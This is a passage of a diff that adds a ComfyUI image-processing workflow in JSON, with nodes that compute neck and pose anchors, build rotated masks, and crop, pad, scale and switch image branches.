+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "7067:7243": {
+    "inputs": {
+      "image_width": 1024,
+      "image_height": 1024,
+      "side": 1,
+      "anchor_side_ratio": 0.3,
+      "anchor_vertical_ratio": 0.28,
+      "pose_keypoints": [
+        "6810",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromPose",
+    "_meta": {
+      "title": "Compute Anchor From Pose"
+    }
+  },
+  "7067:7244": {
+    "inputs": {
+      "side": 1,
+      "anchor_side_ratio": 0.3,
+      "anchor_vertical_ratio": 0.28,
+      "neck_mask": [
+        "6981",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromNeckSegmentation",
+    "_meta": {
+      "title": "Compute Anchor From Neck Segmentation"
+    }
+  },
+  "7067:7245": {
+    "inputs": {
+      "comparison": "a == b",
+      "a": [
+        "7067:7243",
+        3
+      ],
+      "b": [
+        "7067:7242",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "7067:7246": {
+    "inputs": {
+      "boolean": [
+        "7067:7245",
+        0
+      ],
+      "on_true": [
+        "7067:7244",
+        0
+      ],
+      "on_false": [
+        "7067:7243",
+        0
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7067:7247": {
+    "inputs": {
+      "number": [
+        "7067:7248",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7067:7248": {
+    "inputs": {
+      "boolean": [
+        "7067:7245",
+        0
+      ],
+      "on_true": [
+        "7067:7244",
+        1
+      ],
+      "on_false": [
+        "7067:7243",
+        1
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7067:7249": {
+    "inputs": {
+      "expression": "max(a,b)",
+      "a": [
+        "7067:7264",
+        3
+      ],
+      "b": [
+        "7067:7264",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7067:7250": {
+    "inputs": {
+      "expression": "max(a - b - c,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7067:7258",
+        0
+      ],
+      "c": [
+        "7067:7271",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7067:7251": {
+    "inputs": {
+      "boolean": [
+        "7067:7245",
+        0
+      ],
+      "on_true": [
+        "7067:7244",
+        2
+      ],
+      "on_false": [
+        "7067:7243",
+        2
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7067:7252": {
+    "inputs": {
+      "left": 0,
+      "right": 0,
+      "top": 0,
+      "bottom": 0,
+      "extra_padding": [
+        "7067:7233",
+        1
+      ],
+      "pad_mode": "edge",
+      "color": "0, 0, 0",
+      "image": [
+        "7067:7235",
+        0
+      ],
+      "mask": [
+        "7067:7234",
+        0
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7067:7253": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7067:7254",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7067:7254": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "mirror": "None",
+      "scale": 1.0,
+      "aspect_ratio": 1.0,
+      "rotate": [
+        "7067:7251",
+        0
+      ],
+      "transform_method": "lanczos",
+      "anti_aliasing": 2,
+      "image": [
+        "7067:7252",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: LayerImageTransform",
+    "_meta": {
+      "title": "图层工具：图层图像变换"
+    }
+  },
+  "7067:7255": {
+    "inputs": {
+      "expression": "max(a - b - c,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7067:7256",
+        0
+      ],
+      "c": [
+        "7067:7271",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7067:7256": {
+    "inputs": {
+      "expression": "max(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7067:7260",
+        0
+      ],
+      "c": [
+        "7067:7271",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7067:7258": {
+    "inputs": {
+      "expression": "max(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7067:7247",
+        0
+      ],
+      "c": [
+        "7067:7271",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7067:7260": {
+    "inputs": {
+      "number": [
+        "7067:7246",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7067:7262": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7067:7269",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7067:7263": {
+    "inputs": {
+      "anchor_x": [
+        "7067:7246",
+        0
+      ],
+      "anchor_y": [
+        "7067:7248",
+        0
+      ],
+      "angle": [
+        "7067:7251",
+        0
+      ],
+      "scale": [
+        "7067:7241",
+        0
+      ],
+      "image_width": [
+        "6815",
+        0
+      ],
+      "image_height": [
+        "6815",
+        1
+      ],
+      "width_ratio": [
+        "6864",
+        0
+      ],
+      "height_ratio": [
+        "6863",
+        1
+      ],
+      "feather": 25,
+      "invert": false
+    },
+    "class_type": "CreateRotatedMask",
+    "_meta": {
+      "title": "Create Rotated Mask"
+    }
+  },
+  "7067:7264": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7067:7263",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7067:7265": {
+    "inputs": {
+      "x": [
+        "7067:7264",
+        5
+      ],
+      "y": [
+        "7067:7264",
+        6
+      ],
+      "width": [
+        "7067:7264",
+        3
+      ],
+      "height": [
+        "7067:7264",
+        4
+      ],
+      "mask": [
+        "7067:7263",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7067:7266": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "operation": "and",
+      "destination": [
+        "7067:7240",
+        0
+      ],
+      "source": [
+        "7067:7265",
+        0
+      ]
+    },
+    "class_type": "MaskComposite",
+    "_meta": {
+      "title": "合成遮罩"
+    }
+  },
+  "7067:7267": {
+    "inputs": {
+      "mode": "threshold",
+      "threshold": 0.5,
+      "mask": [
+        "7067:7266",
+        0
+      ]
+    },
+    "class_type": "CalculateMaskArea",
+    "_meta": {
+      "title": "Calculate Mask Area"
+    }
+  },
+  "7067:7268": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7067:7274",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7067:7269": {
+    "inputs": {
+      "left": [
+        "7067:7256",
+        0
+      ],
+      "right": [
+        "7067:7255",
+        0
+      ],
+      "top": [
+        "7067:7258",
+        0
+      ],
+      "bottom": [
+        "7067:7250",
+        0
+      ],
+      "extra_padding": 0,
+      "pad_mode": "edge",
+      "color": "0, 0, 0",
+      "image": [
+        "7067:7271",
+        0
+      ],
+      "mask": [
+        "7067:7271",
+        1
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7067:7270": {
+    "inputs": {
+      "expression": "-min(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7067:7260",
+        0
+      ],
+      "c": [
+        "7067:7271",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7067:7271": {
+    "inputs": {
+      "scale": 1.0,
+      "method": "lanczos",
+      "scale_by": "longest",
+      "scale_by_length": [
+        "7067:7249",
+        0
+      ],
+      "image": [
+        "7067:7239",
+        0
+      ],
+      "mask": [
+        "7067:7238",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: ImageScaleRestore V2",
+    "_meta": {
+      "title": "图层工具：缩放恢复 V2"
+    }
+  },
+  "7067:7273": {
+    "inputs": {
+      "expression": "-min(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7067:7247",
+        0
+      ],
+      "c": [
+        "7067:7271",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7067:7274": {
+    "inputs": {
+      "width": [
+        "6815",
+        0
+      ],
+      "height": [
+        "6815",
+        1
+      ],
+      "x": [
+        "7067:7270",
+        0
+      ],
+      "y": [
+        "7067:7273",
+        0
+      ],
+      "image": [
+        "7067:7269",
+        0
+      ]
+    },
+    "class_type": "ImageCrop",
+    "_meta": {
+      "title": "裁剪图像"
+    }
+  },
+  "7068:7277": {
+    "inputs": {
+      "mask": [
+        "7068:7278",
+        0
+      ]
+    },
+    "class_type": "GetMaskSizeAndCount",
+    "_meta": {
+      "title": "Get Mask Size & Count"
+    }
+  },
+  "7068:7278": {
+    "inputs": {
+      "x": [
+        "7068:7280",
+        5
+      ],
+      "y": [
+        "7068:7280",
+        6
+      ],
+      "width": [
+        "7068:7280",
+        3
+      ],
+      "height": [
+        "7068:7280",
+        4
+      ],
+      "mask": [
+        "7000",
+        1
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7068:7279": {
+    "inputs": {
+      "mask": [
+        "7068:7278",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7068:7280": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7000",
+        1
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7068:7281": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7068:7297",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7068:7282": {
+    "inputs": {
+      "x": [
+        "7068:7281",
+        5
+      ],
+      "y": [
+        "7068:7281",
+        6
+      ],
+      "width": [
+        "7068:7281",
+        3
+      ],
+      "height": [
+        "7068:7281",
+        4
+      ],
+      "mask": [
+        "7068:7297",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7068:7283": {
+    "inputs": {
+      "mask": [
+        "7068:7282",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7068:7284": {
+    "inputs": {
+      "x": [
+        "7068:7308",
+        5
+      ],
+      "y": [
+        "7068:7308",
+        6
+      ],
+      "width": [
+        "7068:7308",
+        3
+      ],
+      "height": [
+        "7068:7308",
+        4
+      ],
+      "mask": [
+        "7062",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7068:7285": {
+    "inputs": {
+      "boolean": [
+        "7068:7289",
+        0
+      ],
+      "on_true": [
+        "7068:7288",
+        3
+      ],
+      "on_false": [
+        "7068:7287",
+        3
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7068:7286": {
+    "inputs": {
+      "value": 0.0
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "7068:7287": {
+    "inputs": {
+      "image_width": 1024,
+      "image_height": 1024,
+      "side": 1,
+      "anchor_side_ratio": 0.18,
+      "anchor_vertical_ratio": 0.28,
+      "pose_keypoints": [
+        "6810",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromPose",
+    "_meta": {
+      "title": "Compute Anchor From Pose"
+    }
+  },
+  "7068:7288": {
+    "inputs": {
+      "side": 1,
+      "anchor_side_ratio": 0.18,
+      "anchor_vertical_ratio": 0.28,
+      "neck_mask": [
+        "6981",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromNeckSegmentation",
+    "_meta": {
+      "title": "Compute Anchor From Neck Segmentation"
+    }
+  },
+  "7068:7289": {
+    "inputs": {
+      "comparison": "a == b",
+      "a": [
+        "7068:7287",
+        3
+      ],
+      "b": [
+        "7068:7286",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "7068:7290": {
+    "inputs": {
+      "boolean": [
+        "7068:7289",
+        0
+      ],
+      "on_true": [
+        "7068:7288",
+        0
+      ],
+      "on_false": [
+        "7068:7287",
+        0
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7068:7291": {
+    "inputs": {
+      "number": [
+        "7068:7292",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7068:7292": {
+    "inputs": {
+      "boolean": [
+        "7068:7289",
+        0
+      ],
+      "on_true": [
+        "7068:7288",
+        1
+      ],
+      "on_false": [
+        "7068:7287",
+        1
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7068:7293": {
+    "inputs": {
+      "expression": "max(a,b)",
+      "a": [
+        "7068:7308",
+        3
+      ],
+      "b": [
+        "7068:7308",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7068:7294": {
+    "inputs": {
+      "expression": "max(a - b - c,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7068:7302",
+        0
+      ],
+      "c": [
+        "7068:7315",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7068:7295": {
+    "inputs": {
+      "boolean": [
+        "7068:7289",
+        0
+      ],
+      "on_true": [
+        "7068:7288",
+        2
+      ],
+      "on_false": [
+        "7068:7287",
+        2
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7068:7296": {
+    "inputs": {
+      "left": 0,
+      "right": 0,
+      "top": 0,
+      "bottom": 0,
+      "extra_padding": [
+        "7068:7277",
+        1
+      ],
+      "pad_mode": "edge",
+      "color": "0, 0, 0",
+      "image": [
+        "7068:7279",
+        0
+      ],
+      "mask": [
+        "7068:7278",
+        0
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7068:7297": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7068:7298",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7068:7298": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "mirror": "None",
+      "scale": 1.0,
+      "aspect_ratio": 1.0,
+      "rotate": [
+        "7068:7295",
+        0
+      ],
+      "transform_method": "lanczos",
+      "anti_aliasing": 2,
+      "image": [
+        "7068:7296",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: LayerImageTransform",
+    "_meta": {
+      "title": "图层工具：图层图像变换"
+    }
+  },
+  "7068:7299": {
+    "inputs": {
+      "expression": "max(a - b - c,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7068:7300",
+        0
+      ],
+      "c": [
+        "7068:7315",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7068:7300": {
+    "inputs": {
+      "expression": "max(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7068:7304",
+        0
+      ],
+      "c": [
+        "7068:7315",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7068:7302": {
+    "inputs": {
+      "expression": "max(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7068:7291",
+        0
+      ],
+      "c": [
+        "7068:7315",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7068:7304": {
+    "inputs": {
+      "number": [
+        "7068:7290",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7068:7306": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7068:7313",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7068:7307": {
+    "inputs": {
+      "anchor_x": [
+        "7068:7290",
+        0
+      ],
+      "anchor_y": [
+        "7068:7292",
+        0
+      ],
+      "angle": [
+        "7068:7295",
+        0
+      ],
+      "scale": [
+        "7068:7285",
+        0
+      ],
+      "image_width": [
+        "6815",
+        0
+      ],
+      "image_height": [
+        "6815",
+        1
+      ],
+      "width_ratio": [
+        "6864",
+        0
+      ],
+      "height_ratio": [
+        "6863",
+        1
+      ],
+      "feather": 25,
+      "invert": false
+    },
+    "class_type": "CreateRotatedMask",
+    "_meta": {
+      "title": "Create Rotated Mask"
+    }
+  },
+  "7068:7308": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7068:7307",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7068:7309": {
+    "inputs": {
+      "x": [
+        "7068:7308",
+        5
+      ],
+      "y": [
+        "7068:7308",
+        6
+      ],
+      "width": [
+        "7068:7308",
+        3
+      ],
+      "height": [
+        "7068:7308",
+        4
+      ],
+      "mask": [
+        "7068:7307",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7068:7310": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "operation": "and",
+      "destination": [
+        "7068:7284",
+        0
+      ],
+      "source": [
+        "7068:7309",
+        0
+      ]
+    },
+    "class_type": "MaskComposite",
+    "_meta": {
+      "title": "合成遮罩"
+    }
+  },
+  "7068:7311": {
+    "inputs": {
+      "mode": "threshold",
+      "threshold": 0.5,
+      "mask": [
+        "7068:7310",
+        0
+      ]
+    },
+    "class_type": "CalculateMaskArea",
+    "_meta": {
+      "title": "Calculate Mask Area"
+    }
+  },
+  "7068:7312": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7068:7318",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7068:7313": {
+    "inputs": {
+      "left": [
+        "7068:7300",
+        0
+      ],
+      "right": [
+        "7068:7299",
+        0
+      ],
+      "top": [
+        "7068:7302",
+        0
+      ],
+      "bottom": [
+        "7068:7294",
+        0
+      ],
+      "extra_padding": 0,
+      "pad_mode": "edge",
+      "color": "0, 0, 0",
+      "image": [
+        "7068:7315",
+        0
+      ],
+      "mask": [
+        "7068:7315",
+        1
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7068:7314": {
+    "inputs": {
+      "expression": "-min(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7068:7304",
+        0
+      ],
+      "c": [
+        "7068:7315",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7068:7315": {
+    "inputs": {
+      "scale": 1.0,
+      "method": "lanczos",
+      "scale_by": "longest",
+      "scale_by_length": [
+        "7068:7293",
+        0
+      ],
+      "image": [
+        "7068:7283",
+        0
+      ],
+      "mask": [
+        "7068:7282",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: ImageScaleRestore V2",
+    "_meta": {
+      "title": "图层工具：缩放恢复 V2"
+    }
+  },
+  "7068:7317": {
+    "inputs": {
+      "expression": "-min(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7068:7291",
+        0
+      ],
+      "c": [
+        "7068:7315",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7068:7318": {
+    "inputs": {
+      "width": [
+        "6815",
+        0
+      ],
+      "height": [
+        "6815",
+        1
+      ],
+      "x": [
+        "7068:7314",
+        0
+      ],
+      "y": [
+        "7068:7317",
+        0
+      ],
+      "image": [
+        "7068:7313",
+        0
+      ]
+    },
+    "class_type": "ImageCrop",
+    "_meta": {
+      "title": "裁剪图像"
+    }
+  },
+  "6967:6964": {
+    "inputs": {
+      "boolean": [
+        "6965",
+        0
+      ],
+      "on_true": [
+        "7064:7136",
+        0
+      ],
+      "on_false": [
+        "7065:7180",
+        0
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "6967:7076": {
+    "inputs": {
+      "boolean": [
+        "6965",
+        0
+      ],
+      "on_true": [
+        "7064:7135",
+        1
+      ],
+      "on_false": [
+        "7065:7179",
+        1
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "6974:7079": {
+    "inputs": {
+      "boolean": [
+        "6973",
+        0
+      ],
+      "on_true": [
+        "7068:7312",
+        0
+      ],
+      "on_false": [
+        "7067:7268",
+        0
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "6974:7080": {
+    "inputs": {
+      "boolean": [
+        "6973",
+        0
+      ],
+      "on_true": [
+        "7068:7311",
+        1
+      ],
+      "on_false": [
+        "7067:7267",
+        1
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "6970:7077": {
+    "inputs": {
+      "boolean": [
+        "6968",
+        0
+      ],
+      "on_true": [
+        "6967:6964",
+        0
+      ],
+      "on_false": [
+        "7052:7032",
+        0
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "6970:7078": {
+    "inputs": {
+      "boolean": [
+        "6968",
+        0
+      ],
+      "on_true": [
+        "6967:7076",
+        0
+      ],
+      "on_false": [
+        "7052:6907",
+        1
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "6978:7081": {
+    "inputs": {
+      "boolean": [
+        "6975",
+        0
+      ],
+      "on_true": [
+        "6974:7079",
+        0
+      ],
+      "on_false": [
+        "7066:7224",
+        0
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "6978:7082": {
+    "inputs": {
+      "boolean": [
+        "6975",
+        0
+      ],
+      "on_true": [
+        "6974:7080",
+        0
+      ],
+      "on_false": [
+        "7066:7223",
+        1
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
     }
   }
 }
